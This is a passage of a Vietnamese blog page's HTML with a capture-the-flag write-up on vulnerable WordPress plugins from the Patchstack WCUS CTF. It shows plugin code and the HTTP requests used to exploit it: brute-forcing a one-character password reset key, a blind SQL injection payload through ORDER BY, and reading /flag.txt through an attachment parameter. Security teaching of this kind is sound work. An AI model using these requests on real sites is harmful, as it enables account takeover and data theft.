dung của file flag sẽ được trả về dưới dạng một phần của thông báo lỗi. Bằng cách này, chúng ta có thể dễ dàng đọc được flag mà không cần phải vượt qua các kiểm tra file loại bỏ thông thường.\nKhai thác:   Gửi yêu cầu với mess_attachment trỏ đến file flag /flag.txt:\n1 2 3 4  POST /wp-admin/admin-ajax.php?action=send_message Content-Type: application/x-www-form-urlencoded formdata=jotac-plugin-messages[jot-message]=test_message\u0026jotac-plugin-messages[jot-message-type]=jot-sms\u0026jotac-plugin-messages[jot-attachment]=/flag.txt\u0026sec=6AGmIzDZktwJCaQt   Với giá trị sec được lấy từ\n1 2 3 4 5 6 7  public function __construct () { $this-product = \"JOTAC SMS\";\t$this-token = 'jotac-plugin'; $this-key = '6AGmIzDZktwJCaQt'; $this-version = '4.0.0'; $this-debug = false;\t    Khi xảy ra lỗi trong quá trình gửi tin nhắn (trong case 'jot-sms'), nội dung của file flag được lưu trong $attachment_raw sẽ xuất hiện trong phản hồi lỗi trả về từ server.\n  Phần tiếp theo bạn đọc đọc tại đây https://viblo.asia/p/writeup-patchstack-wcus-ctf-obA46w1BJKv\n","wordCount":"3929","inLanguage":"en","datePublished":"2024-09-21T16:28:54+07:00","dateModified":"2024-09-21T16:28:54+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>Writeup Patchstack WCUS CTF</h1><div class=post-meta><span title="2024-09-21 16:28:54 +0700 +0700">September 21, 2024</span>&nbsp;·&nbsp;19 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#wp-elevator aria-label="WP Elevator">WP Elevator</a></li><li><a href=#link-manager aria-label="Link Manager">Link Manager</a><ul><ul><li><a href=#khai-th%c3%a1c-sql-injection aria-label="Khai thác SQL Injection">Khai thác SQL Injection</a></li></ul></ul></li><li><a href=#justinwonkytokens aria-label=JustinWonkyTokens>JustinWonkyTokens</a></li><li><a href=#timberlake aria-label=Timberlake>Timberlake</a><ul><ul><li><a href=#gi%e1%ba%a3i-th%c3%adch-chi-ti%e1%ba%bft-c%c3%a1c-ph%e1%ba%a7n-quan-tr%e1%bb%8dng aria-label="Giải thích chi tiết các phần quan trọng:">Giải thích chi tiết các phần quan trọng:</a></li><li><a href=#c%c3%a1ch-khai-th%c3%a1c-ti%e1%bb%81m-n%c4%83ng aria-label="Cách khai thác tiềm năng:">Cách khai thác tiềm năng:</a></li><li><a href=#ph%c3%a2n-t%c3%adch-ti%e1%ba%bfp-theo aria-label="Phân tích tiếp theo">Phân tích tiếp theo</a></li><li><a href=#ph%c3%a2n-t%c3%adch-chi-ti%e1%ba%bft-%c4%91o%e1%ba%a1n-code-save_session aria-label="Phân tích chi tiết đoạn code save_session():">Phân tích chi tiết đoạn code <code>save_session()</code>:</a></li><li><a href=#khai-th%c3%a1c-kh%e1%ba%a3-n%c4%83ng-l%c6%b0u-ssti-v%c3%a0o-session-file aria-label="Khai thác khả năng lưu SSTI vào session file:">Khai thác khả năng lưu SSTI vào session file:</a></li><li><a href=#c%c3%a1ch-khai-th%c3%a1c aria-label="Cách khai thác:">Cách khai thác:</a></li></ul></ul></li><li><a href=#texting-trouble aria-label="Texting Trouble">Texting Trouble</a><ul><ul><li><a href=#ph%c3%a2n-t%c3%adch-l%e1%bb%97-h%e1%bb%95ng-trong-h%c3%a0m-send_message_callback-v%c3%a0-khai-th%c3%a1c-qua-file_get_contents aria-label="Phân tích lỗ hổng trong hàm send_message_callback() và khai thác qua file_get_contents()">Phân tích lỗ hổng trong hàm <code>send_message_callback()</code> và khai thác qua <code>file_get_contents()</code></a></li><li><a href=#khai-th%c3%a1c aria-label="Khai thác:">Khai thác:</a></li></ul></ul></li></ul></div></details></div><div class=post-content><p>Trong thời gian gần đây, Patchstack đã tổ chức cuộc thi Patchstack WCUS CTF, bao gồm 9 thử thách (challenge), tất cả đều tập trung vào việc khai thác các lỗ hổng bảo mật trong các plugin WordPress. Sau đây là một số writeup về các thử thách đó.</p><p>Tất cả các challenge đều được cung cấp dưới dạng whitebox.</p><h1 id=wp-elevator>WP Elevator<a hidden class=anchor aria-hidden=true href=#wp-elevator>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/0e94303d-3548-47a0-ace3-7738f3969f89.png alt=image.png></p><p>Trong challenge này, đề bài cung cấp cho chúng ta một plugin WordPress. Nhiệm vụ của chúng ta là gọi đúng endpoint để lấy được flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s2>&#34;wp_ajax_patchstack_flagger&#34;</span><span class=p>,</span> <span class=s2>&#34;flagger_request_callback&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>flagger_request_callback</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Validate nonce
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$nonce</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;nonce&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=o>?</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;nonce&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>wp_verify_nonce</span><span class=p>(</span><span class=nv>$nonce</span><span class=p>,</span> <span class=s2>&#34;get_latest_posts_nonce&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s2>&#34;Invalid nonce.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$user</span> <span class=o>=</span> <span class=nx>wp_get_current_user</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$allowed_roles</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;administrator&#34;</span><span class=p>,</span> <span class=s2>&#34;subscriber&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>array_intersect</span><span class=p>(</span><span class=nv>$allowed_roles</span><span class=p>,</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>roles</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$value</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>([</span><span class=s2>&#34;value&#34;</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s2>&#34;Missing permission.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Vậy, chỉ cần chúng ta có được role <code>administrator</code> hoặc <code>subscriber</code>, chúng ta sẽ nhận được flag.</p><p>Nhưng làm thế nào để có thể đăng ký một tài khoản <code>subscriber</code>? Trong mã nguồn, có một đoạn code cho phép tạo người dùng mới với role <code>subscriber</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>create_user_via_api</span><span class=p>(</span><span class=nv>$request</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$parameters</span> <span class=o>=</span> <span class=nv>$request</span><span class=o>-&gt;</span><span class=na>get_json_params</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$username</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$parameters</span><span class=p>[</span><span class=s2>&#34;username&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$email</span> <span class=o>=</span> <span class=nx>sanitize_email</span><span class=p>(</span><span class=nv>$parameters</span><span class=p>[</span><span class=s2>&#34;email&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$password</span> <span class=o>=</span> <span class=nx>wp_generate_password</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Create user
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nx>wp_create_user</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>,</span> <span class=nv>$email</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_wp_error</span><span class=p>(</span><span class=nv>$user_id</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nx>WP_Error</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;user_creation_failed&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>__</span><span class=p>(</span><span class=s2>&#34;User creation failed.&#34;</span><span class=p>,</span> <span class=s2>&#34;text_domain&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=s2>&#34;status&#34;</span> <span class=o>=&gt;</span> <span class=mi>500</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Add user role
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$user</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WP_User</span><span class=p>(</span><span class=nv>$user_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>set_role</span><span class=p>(</span><span class=s2>&#34;subscriber&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;message&#34;</span> <span class=o>=&gt;</span> <span class=nx>__</span><span class=p>(</span><span class=s2>&#34;User created successfully.&#34;</span><span class=p>,</span> <span class=s2>&#34;text_domain&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;user_id&#34;</span> <span class=o>=&gt;</span> <span class=nv>$user_id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Yêu cầu POST để tạo tài khoản mới:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-json/user/v1/create</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;newuser&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;email&#34;</span><span class=p>:</span> <span class=s2>&#34;newuser@example.com&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Tuy nhiên, khi tạo người dùng mới, chỉ có <code>username</code> và <code>email</code> được truyền đi, mà không có mật khẩu để đăng nhập. Plugin này còn cung cấp một tính năng khác là <code>reset_password_key_callback()</code>, cho phép yêu cầu reset mật khẩu cho bất kỳ tài khoản nào. Chúng ta có thể sử dụng <code>$key</code> được tạo từ <code>get_password_reset_key2()</code> để thực hiện việc reset mật khẩu.</p><p>Request yêu cầu reset password:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=reset_key&amp;user_id=71
</span></span></code></pre></td></tr></table></div></div><p>Tuy nhiên, <code>$key</code> được tạo ra chỉ có 1 ký tự duy nhất, điều này cho phép chúng ta brute force key để reset mật khẩu cho tài khoản <code>subscriber</code> vừa tạo.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=nx>wp_generate_password</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Do môi trường của tôi không được cấu hình server mail, nên tôi gặp khó khăn trong việc xác định chính xác endpoint để reset mật khẩu bằng key. Sau khi tham khảo ChatGPT, tôi đã nhận được câu trả lời như sau:</p><p><img loading=lazy src=https://images.viblo.asia/d14b2476-ba4a-45af-826e-61e98fcaf96f.png alt=image.png></p><p>Tôi đã thử sử dụng endpoint này để reset mật khẩu cho tài khoản <code>subscriber</code>.Tuy nhiên, sau đó tôi phát hiện ra một endpoint tốt hơn để thực hiện việc này.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-login.php?action=resetpass</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pass1=123&amp;pw_weak=on&amp;pass2=123&amp;rp_key=R&amp;wp-submit=Save+Password
</span></span></code></pre></td></tr></table></div></div><p>Sau khi reset thành công và có được tài khoản <code>subscriber</code>, tôi tiếp tục gửi yêu cầu đến hàm <code>get_latest_posts_callback</code> để lấy giá trị <code>nonce</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>&lt;subcriber&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=get_latest_posts_callback
</span></span></code></pre></td></tr></table></div></div><p>Khi đã có <code>nonce</code>, tôi chỉ cần gửi yêu cầu tới <code>flagger_request_callback()</code> và truyền giá trị <code>nonce</code> đó để nhận flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>&lt;subcriber&gt;</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=patchstack_flagger&amp;nonce=b920667f1a
</span></span></code></pre></td></tr></table></div></div><h1 id=link-manager>Link Manager<a hidden class=anchor aria-hidden=true href=#link-manager>#</a></h1><p>Đập vào mắt đầu tiên là đoạn code dễ dàng bị khai thác SQL Injection tại:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_link_data</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$wpdb</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$table_name</span> <span class=o>=</span> <span class=nv>$wpdb</span><span class=o>-&gt;</span><span class=na>prefix</span> <span class=o>.</span> <span class=s1>&#39;links&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$link_name</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;link_name&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$order</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;order&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$orderby</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;orderby&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>validate_order</span><span class=p>(</span><span class=nv>$order</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>validate_order_by</span><span class=p>(</span><span class=nv>$orderby</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nv>$results</span> <span class=o>=</span> <span class=nv>$wpdb</span><span class=o>-&gt;</span><span class=na>get_results</span><span class=p>(</span><span class=s2>&#34;SELECT * FROM wp_links where link_name = &#39;</span><span class=si>$link_name</span><span class=s2>&#39; order by </span><span class=si>$orderby</span><span class=s2> </span><span class=si>$order</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$results</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=nv>$results</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;No data found.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Mặc dù có đoạn validate dữ liệu truyền vào, nhưng nó chỉ để đánh lừa và không thực sự ngăn chặn được SQL Injection. Chúng ta vẫn có thể khai thác lỗ hổng qua biến <code>$orderby $order</code>.</p><p>Để khai thác được lỗ hổng này, trước tiên cần thêm dữ liệu vào mà không cần xác thực thông qua hook sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span> <span class=s1>&#39;wp_ajax_nopriv_submit_link&#39;</span><span class=p>,</span> <span class=s1>&#39;handle_ajax_link_submission&#39;</span> <span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Chúng ta có thể gửi yêu cầu thêm dữ liệu và lấy giá trị <code>nonce</code> từ trang chủ, thông qua biến <code>var ajaxNonce = 'bb01b00013';</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=submit_link&amp;url=http://example.com&amp;name=test&amp;description=test&amp;nonce=bb01b00013
</span></span></code></pre></td></tr></table></div></div><h3 id=khai-thác-sql-injection>Khai thác SQL Injection<a hidden class=anchor aria-hidden=true href=#khai-thác-sql-injection>#</a></h3><p>Trong đoạn truy vấn SQL sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$results</span> <span class=o>=</span> <span class=nv>$wpdb</span><span class=o>-&gt;</span><span class=na>get_results</span><span class=p>(</span><span class=s2>&#34;SELECT * FROM wp_links where link_name = &#39;</span><span class=si>$link_name</span><span class=s2>&#39; order by </span><span class=si>$orderby</span><span class=s2> </span><span class=si>$order</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Chúng ta có thể khai thác SQL Injection qua <code>order by</code>, nhưng do response không hiển thị lỗi nên không thể sử dụng kỹ thuật error-based SQLi. Thay vào đó, có hai cách khai thác: <strong>time-based blind SQL Injection</strong> hoặc <strong>boolean-based blind SQL Injection</strong>.</p><p>Tôi đã chọn cách khai thác bằng <strong>boolean-based blind SQL Injection</strong> vì cách này nhanh hơn cho brute force. Payload sử dụng có dạng (cảm ơn người anh homie đã chia sẻ payload này):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=p>(</span><span class=k>CASE</span><span class=w> </span><span class=k>WHEN</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>THEN</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>ELSE</span><span class=w> </span><span class=mi>6096</span><span class=o>*</span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=mi>6096</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=p>)</span><span class=w> </span><span class=k>END</span><span class=p>))</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Chỉ cần thay phần <code>1=1</code> bằng các điều kiện boolean hoặc time-based khác là được. Tôi đã chọn sử dụng boolean-based vì nó hiệu quả hơn trong trường hợp này.</p><blockquote><p>Lưu ý: Công cụ <code>sqlmap</code> không thể khai thác lỗ hổng này do hạn chế trong việc gửi payload. Nếu có cách sử dụng tốt hơn, các bạn đọc có thể gợi ý thêm nhé. Vì không thể khai thác tự động bằng công cụ, tôi đành phải &ldquo;manual&rdquo; 😥.</p></blockquote><p>Trong quá trình khai thác, tôi gặp hai vấn đề lớn:</p><ol><li><strong>Không thể sử dụng dấu <code>'</code></strong>.</li><li><strong>Không thể so sánh chuỗi</strong>.</li></ol><p>Nguyên nhân không sử dụng được dấu <code>'</code> là do tính năng <a href=https://viblo.asia/p/phan-tich-cve-2023-23488-paid-memberships-pro-298-unauthenticated-blind-sqli-va-van-de-voi-request-trong-wordpress-gwd43k2q4X9#_addslash-tai-wordpress-1>Addslashes của WordPress</a> mà tôi đã trình bày trong bài viết trước. Việc này cũng khiến không thể so sánh chuỗi một cách thông thường.</p><p>Giải pháp thay thế là sử dụng 